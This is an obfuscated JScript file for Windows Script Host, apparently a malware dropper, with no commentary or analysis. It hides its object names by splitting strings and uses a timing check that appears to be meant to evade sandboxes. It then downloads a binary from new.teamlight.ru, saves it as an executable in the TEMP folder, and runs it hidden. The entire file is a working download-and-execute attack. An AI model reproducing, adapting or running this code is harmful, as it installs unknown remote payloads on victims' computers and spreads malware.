var W0 = false;
var AG = "Create"+"Object";
var B0 = function PD() {return WScript[AG]("WScript"+".Shell");}(), E0 = 11;
var TW = "MSXML2"+".XMLHTTP";
var XK = 2;
var I0 = XK - 2;
function I(VA){B0["Run"](VA, I0, I0);};
function X(){return TW + "";};
function J(Q, XO){I0 = I0 * 1; return Q - XO;};
function V(){return AG;};
/*@cc_on
  @if (@_win32 || @_win64)
    W0 = true;
  @end
@*/
if (W0)
{
var B = "";
function M(){return 22;};
var E = 0; var YO = 0;
function L1()
{
var W = new this["Date"]();
var K = W["getUTCMilliseconds"]();
WScript["Sleep"](M());
var W = new this["Date"]();
var OZ = W["getUTCMilliseconds"]();
WScript["Sleep"](M());
var W = new this["Date"]();
var WO = W["getUTCMilliseconds"]();
var E = "N";
E = J(OZ, K);
var YO = "JD";
YO = J(WO, OZ);
B = "open";
return J(E, YO);
}
var XC = false;
var AI = false;
for (var OF = I0; OF < M() * 1; OF++){if (L1() != I0){
XC = true; 
YO = "31" + 11 * E + YO; 
AI = true; 
break;
}}
function L() {return ((XC == true) && (XC == AI)) ? 1 : I0;};
if (XC && L() && AI){
function F() {return B0["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "I0U6SN5qROMpuy.ex" + "e";};
 KC = X();
 ZQ = WScript[AG](KC);
 var M0 = 1;
do { 
	for (;M0;){
	try {
		if (M0 == 1)
		{
			ZQ[B]("GET", "http://new.teamlight.ru/si8svf", false);
			ZQ["send"]();
			I1 = "Sleep";
			M0 = 2;
		}
		WScript[I1](M() + 120); 
		if (ZQ["readystate"] < 2 * 2) continue;
		M0 = I0;
		function L0(DL) {var TP = (1, 2, 3, 4, 5, DL); return TP;};
		BJ = WScript[V()]("ADODB.Stream");
		KC = BJ;
		KC[B]();
		KC["type"] = L0(1);
		KC["write"](ZQ["ResponseBody"]);
		BJ["position"] = L0(I0);
		KC["Save" + "ToFile"](F(), 2);
		BJ["cl"+"ose"]();
		Y = F();
		I(Y);
	} catch(DN){};};
}while (M0);
}
}

